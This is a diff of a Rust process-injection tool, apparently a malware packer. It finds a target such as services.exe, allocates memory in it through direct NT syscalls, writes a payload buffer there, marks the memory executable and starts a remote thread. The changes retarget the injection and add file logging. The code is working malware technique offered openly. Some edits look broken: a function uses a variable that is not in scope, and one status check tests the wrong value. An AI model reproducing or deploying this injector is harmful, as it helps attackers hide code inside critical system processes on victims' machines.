@@ -34,6 +34,7 @@ fn append_to_file(file_path: &str, data: &[u8]) -> std::io::Result<()> {
     Ok(())
 }
 
+/*
 fn boxboxbox(tar: &str) -> Vec<usize> {
     // search for processes to inject into
     let mut dom: Vec<usize> = Vec::new();
@@ -41,6 +42,23 @@ fn boxboxbox(tar: &str) -> Vec<usize> {
     for pro in s.processes_by_exact_name(tar) {
         println!("{} {}\n", pro.pid(), pro.name());
         dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
+    }
+    return dom;
+}
+*/
+
+fn boxboxbox(tar: &str) -> Vec<usize> {
+    // search for processes to inject into
+    let mut dom: Vec<usize> = Vec::new();
+    let s = System::new_all();
+    for pro in s.processes() {
+        if let Err(error) = append_to_file(file_path, format!("Process found: {} {}\n", pro.pid(), pro.name()).as_bytes()) {
+            eprintln!("Error appending to file: {}", error);
+        }
+        if pro.name().to_lowercase() == tar.to_lowercase() {
+            println!("{} {}\n", pro.pid(), pro.name());
+            dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
+        }
     }
     return dom;
 }
@@ -59,7 +77,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         let open_status = syscall!("NtOpenProcess", &mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
         if !NT_SUCCESS(open_status) {
             println!("Error opening process: {}\n", open_status);
-            if let Err(error) = append_to_file(file_path, b"Error opening process") {
+            if let Err(error) = append_to_file(file_path, b"Error opening process\n") {
                 eprintln!("Error appending to file: {}", error);
             } else {
                 println!("Data appended to file successfully.");
@@ -70,7 +88,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         let alloc_status = syscall!("NtAllocateVirtualMemory", process_handle, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if !NT_SUCCESS(alloc_status) {
             println!("Error allocating memory to the target process: {}\n", alloc_status);
-            if let Err(error) = append_to_file(file_path, b"Error allocating memory to the target process") {
+            if let Err(error) = append_to_file(file_path, b"Error allocating memory to the target process\n") {
                 eprintln!("Error appending to file: {}", error);
             } else {
                 println!("Data appended to file successfully.");
@@ -82,7 +100,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         let write_status = syscall!("NtWriteVirtualMemory", process_handle, allocstart, buffer, buffer_length, &mut byteswritten);
         if !NT_SUCCESS(write_status) {
             println!("Error writing to the target process: {}\n", write_status);
-            if let Err(error) = append_to_file(file_path, b"Error writing to the target process") {
+            if let Err(error) = append_to_file(file_path, b"Error writing to the target process\n") {
                 eprintln!("Error appending to file: {}", error);
             } else {
                 println!("Data appended to file successfully.");
@@ -93,7 +111,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
         let protect_status = syscall!("NtProtectVirtualMemory", process_handle, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
         if !NT_SUCCESS(protect_status) {
             println!("[-] Failed to call NtProtectVirtualMemory: {:#x}\n", protect_status);
-            if let Err(error) = append_to_file(file_path, b"Failed to mark memory region as RWX") {
+            if let Err(error) = append_to_file(file_path, b"Failed to mark memory region as RWX\n") {
                 eprintln!("Error appending to file: {}", error);
             } else {
                 println!("Data appended to file successfully.");
@@ -107,7 +125,7 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
 
         if write_status != 0 {
             println!("Error failed to create remote thread: {:#02X}\n", write_thread);
-            if let Err(error) = append_to_file(file_path, b"Failed to create remote thread") {
+            if let Err(error) = append_to_file(file_path, b"Failed to create remote thread\n") {
                 eprintln!("Error appending to file: {}", error);
             } else {
                 println!("Data appended to file successfully.");
@@ -118,10 +136,10 @@ fn enhance(mut buf: Vec<u8>, tar: usize) {
 
 fn main() {
     // inject in the following processes:
-    let tar: &str = "spoolsv.exe";
+    let tar: &str = "services.exe";
     let file_path = "packer-log.txt";
 
-    if let Err(error) = append_to_file(file_path, b"Injection began!") {
+    if let Err(error) = append_to_file(file_path, b"Injection began!\n") {
         eprintln!("Error appending to file: {}", error);
     } else {
         println!("Data appended to file successfully.");
@@ -139,7 +157,7 @@ fn main() {
     }
     let list: Vec<usize> = boxboxbox(tar);
     if list.len() == 0 {
-        if let Err(error) = append_to_file(file_path, b"Cannot find process dllhost.exe!") {
+        if let Err(error) = append_to_file(file_path, b"Cannot find sacrifice process!\n") {
             eprintln!("Error appending to file: {}", error);
         } else {
             println!("Data appended to file successfully.");
